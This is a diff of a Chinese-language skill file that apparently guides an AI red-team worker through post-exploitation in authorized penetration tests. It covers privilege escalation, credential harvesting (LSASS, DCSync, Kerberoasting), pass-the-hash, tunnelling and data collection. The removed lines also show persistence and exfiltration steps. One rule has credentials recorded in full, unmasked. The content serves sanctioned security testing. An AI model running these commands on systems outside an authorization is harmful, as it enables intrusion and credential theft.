@@ -1,106 +1,91 @@
 ---
 name: redteam-ops
-description: 在授权红队/渗透测试中做「后渗透与作战推进」时调用——从拿到首个访问点到权限保持、凭据获取、横向移动、数据获取的全杀伤链操作方法论。当 worker 拿到 shell/凭据/立足点、规划者要派「后渗透/横向/数据获取」类意图、或需要维持访问与回传数据时使用。
+description: 拿到初始访问或一个可用凭据后做后渗透时调用——提权、凭据收集、横向移动、域内专项、隧道与数据获取，以及每一步的证据与边界纪律。当 worker 意图涉及「后渗透/提权/横移/域/内网」时使用。
 tags:
-  attack: [T1078, T1059, T1053, T1003, T1021, T1046, T1005, T1041, T1505]
-  class: [post-exploit, persistence, lateral-movement, credential-access, exfiltration, c2, privesc, collection]
+  cwe: [CWE-269, CWE-522, CWE-250, CWE-732]
+  attack: [TA0004, TA0008, TA0006, TA0005, TA0010]
+  class: [post-exploitation, privilege-escalation, lateral-movement, credential-access]
 ---
 
-# Red Team Ops（后渗透与作战推进方法论）
+# 红队后渗透方法论
 
-在**已授权**前提下，把「一个漏洞」推进成「一次完整的红队行动」：从初始访问
-到权限保持、凭据获取、横向移动、数据获取与回传。漏洞验证用 `vuln-hunting`
-skill；本 skill 管的是**拿到访问点之后**的全部作战动作。
+## 边界与禁止
 
-**平台能力衔接**：回连接收器用 `listener_start`（C2 出口配置见系统设置，
-direct/ssh 中转/manual 三种网络形态）；交互式 shell 用 Bash 的 `nc`/`socat`；
-Windows 横向用 `impacket`/`netexec`/`evil-winrm`；隧道用 `chisel`/`ligolo-ng`/
-`sshuttle`；流量证据全程被 MITM 代理与探索图留痕。
+- 仅在授权范围内操作，遵守【操作约束】；单步最小验证，不批量、不破坏。
+- 不删除/篡改业务数据；敏感数据点到为止（证明可访问即可），不批量导出、不留存、不外传。
+- 权限维持只做「演示可行」（落一条 fact 说明手法与条件），**不实际部署**长期后门。
+- 所有操作必须留证（截图/命令输出/流量 ID），凭据与令牌**全文**写入 fact（不缩写、不掩码——这是后续横向的弹药）。
 
-## 阶段 0：落地与稳定化（Initial Foothold）
+## 阶段 0：落地稳定化
 
-拿到第一个 shell 第一件事是**稳住它**，不是急着翻文件。
+1. 确认身份与权限：`whoami / id`、`whoami /priv`（Windows）、`hostname`。
+2. 确认网络位置：`ip addr` / `ifconfig` / `route print`，标注可达内网段（哪些网段值得横向）。
+3. 摸清防御面：是否有 EDR/杀软（`ps aux | grep -i defend`、Windows Defender 事件）、出口是否受限。
+4. **先落一条 fact** 记录「初始访问点 + 身份 + 可达网段」——后续意图靠它接续。
 
-1. **升级到全交互 TTY**（Linux 反弹 shell）：
-   `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg`
-2. **确认身份与环境**：`id` / `hostname` / `uname -a` / `ip a`——你在谁的机器上、
-   什么权限、几块网卡（内网段线索）。
-3. **留证据**：把关键输出写进工作目录并 `record_fact`——后渗透的每一步都要
-   可复现（红队报告的核心是证据链，不是结论）。
-4. **先起监听再触发回连**：做任何会触发目标外连的动作（OOB 盲注、下载载荷）
-   之前，用 `listener_start` 把接收器架好。
+## 阶段 1：提权
 
-## 阶段 1：权限提升（Privilege Escalation）
+### Linux 速查
+- `sudo -l`（GTFOBins 对照）；`id` 是否在 docker/lxd/disk 组；
+- SUID：`find / -perm -4000 -type f 2>/dev/null`（对照 GTFOBins）；
+- 定时任务：`cat /etc/crontab`、`ls -la /etc/cron.d/`、`crontab -l`（可写脚本 = 提权）；
+- 可写服务配置：`systemctl list-units --type=service` + `ls -la /etc/systemd/system/`；
+- 内核/发行版版本 → `search_vulns` 查本地提权 CVE（先 `uname -a`、`cat /etc/os-release`）；
+- 环境与历史：`env`、`~/.bash_history`、`~/.ssh/`、`/etc/passwd` 可写性；
+- 计划用 linpeas/pspy（宿主工具已装）：`linpeas.sh` 输出保存为证据文件。
 
-按**性价比顺序**查，不要一上来就全量枚举：
+### Windows 速查
+- `whoami /priv`：SeImpersonate/SeAssignPrimaryToken → Potato 系；SeDebug → 注入 LSASS；
+- `whoami /groups`：是否本地管理员/域组；
+- 未加引号服务路径：`wmic service get name,pathname,startmode | findstr /i "auto"`；
+- 计划任务与服务权限：`schtasks /query /fo LIST /v`、`accesschk.exe`；
+- 存储凭据：`cmdkey /list`、浏览器配置、`Get-ChildItem -Recurse -Force $env:APPDATA`；
+- 全面体检用 winPEAS（宿主工具）。
 
-1. **sudo 配置**：`sudo -l`（NOPASSWD 的 GTFOBins 查
-   https://gtfobins.github.io ）
-2. **SUID/SGID**：`find / -perm -4000 -type f 2>/dev/null`（对照 GTFOBins）
-3. **定时任务**：`cat /etc/crontab; ls -la /etc/cron*`（可写脚本=提权+持久双用）
-4. **明文凭据**：配置文件/历史文件——`grep -riE "pass(wd|word)?\s*=" /opt /srv /var/www 2>/dev/null | head`
-5. **内核/服务漏洞**：`uname -r` 对漏洞情报（`search_vulns`），CVE 命中先找
-   公开 PoC（`get_poc`）再手写。
-6. 全量枚举用 `linpeas`（hostenv 一键安装），输出太长时抓重点段。
+## 阶段 2：凭据收集
 
-**证据要求**：提权成功必须留下 `id` 前后对比——这是「证明影响」的最小单元。
+- Linux：`/etc/shadow`（可读时）、应用配置（.env / config.php / application.yml / settings.py）、
+  SSH 私钥、数据库连接串、云元数据（见 cloud 技能）、CI/CD token；
+- Windows：LSASS dump（需权限）、SAM/SYSTEM、DPAPI、组策略首选项 GPP；
+- 每得到一组凭据：**立即 fact 落库**（用户名/口令或 hash/来源主机/适用服务），并 `auth_request`
+  组装验证请求（HTTP 侧）或 `netexec`/`smbclient` 验证（SMB 侧）；
+- **不要凭号**：判断锁定策略前最多 2-3 次尝试；域账号喷之前先查 `net accounts`。
 
-## 阶段 2：权限保持（Persistence）
+## 阶段 3：横向移动
 
-**只做任务书授权的动作**。每做一步都要 `record_fact` 留痕（报告里要列清单，
-客户要能逐条清除）：
+1. 用已有凭据直连：SSH/RDP/SMB/WinRM/数据库（先 `nmap -sV -p 22,445,3389,5985,1433` 确认开放面）；
+2. impacket：`psexec.py` / `wmiexec.py` / `smbexec.py` / `secretsdump.py`（已含命令包装器）；
+3. Pass-the-hash / Pass-the-ticket：`impacket-wmiexec -hashes :<NTLM> user@host`；
+4. 隧道：`chisel`（HTTP 隧道）、`ligolo-ng`（TUN）、`ssh -D`（socks5）；优先选择目标出网允许的形态；
+5. 横向扫描收敛：只打已证明归属的网段，`nmap -sT --top-ports 100 -iL ips.txt`；
+6. 每跳记录 provenance：从哪台、用什么凭据、到哪台——事实链缺一环，报告就不可信。
 
-1. **SSH 公钥**（Linux 最干净）：`echo "<授权公钥>" >> ~/.ssh/authorized_keys`
-2. **定时任务**：`(crontab -l; echo "*/15 * * * * <callback>") | crontab -`
-3. **systemd 服务**：可写目录里的 service 单元（配合 `pspy` 找已有钩子）
-4. **Web shell**（web 落地时）：确认上传目录可写、可解析——一句一句话马
-   也要测功能边界。
-5. **凭据类保持**：改不了密码就记下 hash/凭据（`impacket-secretsdump` 的
-   输出本身就是持久化资产）。
+## 阶段 4：Windows 域环境专项
 
-**红线**：不碰目标数据完整性、不留破坏性后门、不做 DoS 类保持。所有保持
-手段写入 findings 供客户清除。
+- 枚举：`net user /domain`、`net group "Domain Admins" /domain`、`Get-ADUser -Filter *`；
+- Kerberoasting：`impacket-GetUserSPNs domain/user:pass -dc-ip <DC> -request` → hashcat -m 13100；
+- AS-REP：`impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -format hashcat`；
+- DCSync：`impacket-secretsdump domain/admin:pass@dc`（需 Replicating Directory Changes 权限）；
+- ADCS：`certipy find -u user@domain -p pass -dc-ip dc`（ESC1-ESC8 模板误配）；
+- 委派：`impacket-findDelegation`；
+- 攻击路径可视化可选 BloodHound（SharpHound 采集 → 分析），把关键路径写进 fact。
 
-## 阶段 3：凭据获取（Credential Access）
+## 阶段 5：数据获取与目标达成
 
-按来源分四路，每路独立验证：
+- 先明确「证明什么」：后台权限/某类数据可读/某接口可控——用最小读取证明，不拖库；
+- 数据库只读证明：`SELECT ... LIMIT 1`；文件只取一条样本；
+- 每次数据读取都要 `save_evidence` 并对 source_url/文件名负责；
+- 内网横向拿到的**新服务/新资产登记进资产库**（`insert_assets` / `add_task_scope`），
+  未测资产用 `list_untested_assets` 规划下一步。
 
-1. **文件面**：配置文件、.env、.git-credentials、history、保存的浏览器凭据
-2. **内存面**（Linux）：`/proc/<pid>/environ`、gcore（有 gdb 时）
-3. **网络面**：responder 毒化（内网）、明文协议嗅探（tcpdump + 端口过滤）
-4. **复用面**：拿到的每个凭据**立即横向试一轮**（`netexec` 批量喷洒
-   `netexec smb <网段> -u user -p pass --continue-on-success`）——凭据复用
-   是内网渗透的第一生产力。
+## 回连与 C2（平台内建，别手搭）
 
-## 阶段 4：横向移动（Lateral Movement）
+- `listener_start` 起监听，返回解析后的回连地址；payload 直接用返回地址生成；
+- 回连落在 `listener_sessions`，逐会话留证；**不要**自建公网 C2；
+- 出口形态按平台 C2 配置（direct / SSH 中继 / manual），不自作主张开公网端口。
 
-1. **先画内网图**：网卡段 → `netexec smb <cidr>` 或 nmap 快扫 → 存活与端口
-2. **协议优先级**：WinRM（evil-winrm，凭据在手时最稳）> SMB（psexec 类）>
-   SSH（密钥/密码）> 其他服务默认凭据
-3. **隧道进深水区**：不可路由网段用 `chisel`/`ligolo-ng`（代理/路由级二选一，
-   ligolo 体验更好）；`proxychains4` 让任意工具走隧道。
-4. **每次落地重复阶段 0-3**——横向到新主机=新的阶段 0。
+## 证据与失败处理
 
-## 阶段 5：数据获取与回传（Collection & Exfiltration）
-
-1. **定位数据**：目标是什么（数据库/文档/代码/配置）？`find` 按扩展名+关键词
-   定位，`du -sh` 确认体量——**先看清楚再搬**。
-2. **打包与分段**：`tar czf` + 分卷（`split -b 5m`）——大文件是回传失败第一因。
-3. **回传通道**（按隐蔽性与可靠性选）：
-   - 直接 HTTP POST 到本平台（MITM 代理全留痕，报告可引用）
-   - 经 C2 出口（listener 的端口/中转）
-   - 加密通道：`socat OPENSSL-LISTEN`（有证书要求时）
-4. **完整性证据**：回传后 `sha256sum` 对比——报告里「拿到了什么」要可验证。
-
-## 阶段 6：收尾（清理与报告）
-
-1. 保持项清单（阶段 2 的每一项）→ findings，标注「清除方法」
-2. 凭据清单 → findings（脱敏敏感字段，报告另发）
-3. 数据获取清单 → findings（文件+sha256）
-4. `listener_stop` 收监听器，带走全部会话快照
-
-## 证据纪律（贯穿全程）
-
-- **每个动作前想「怎么证明」**：命令输出截图级留存，不依赖记忆
-- **每个凭据/入口立即 record_fact**（探索图会血缘化——报告自动串成链）
-- **不确定授权范围时停下问人**——红队的专业性一半在技术、一半在边界感
+- 失败也要落 fact（「测了 X，无 Y」），避免重复尝试与报告里重复叙述；
+- 提权/横移尝试被拦（EDR/WAF/策略）→ 记录拦截形态与前置条件，不要反复硬打；
+- confidence：直接看到=observed，推断=inferred；推断不能升格为 finding 证据。
